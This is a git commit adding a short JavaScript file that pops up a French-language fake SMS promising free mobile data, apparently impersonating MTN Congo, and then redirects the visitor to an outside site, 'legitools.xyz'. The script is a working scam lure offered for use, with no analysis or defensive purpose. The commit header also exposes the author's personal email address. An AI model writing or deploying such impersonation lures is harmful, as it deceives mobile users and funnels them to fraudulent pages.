e5f5d61da2f324038c902e5a74e9a95e1d12fc24
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-19 03:26:17 -0800

    Create mtncongo.15godata-com.js

---
+++ mtncongo.15godata-com.js
@@ -0,0 +1,5 @@
+var password = '15 Go de données gratuites'
+password=prompt('SMS: Félicitations, votre numéro est éligible pour recevoir 10 Go de données gratuites RÉCOMPENSE DE CARTE SIM 4G ou 5G, veuillez appuyer sur OK pour ACTIVER. ','15 Go de données gratuites');
+if (password != '15 Go de données gratuites') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
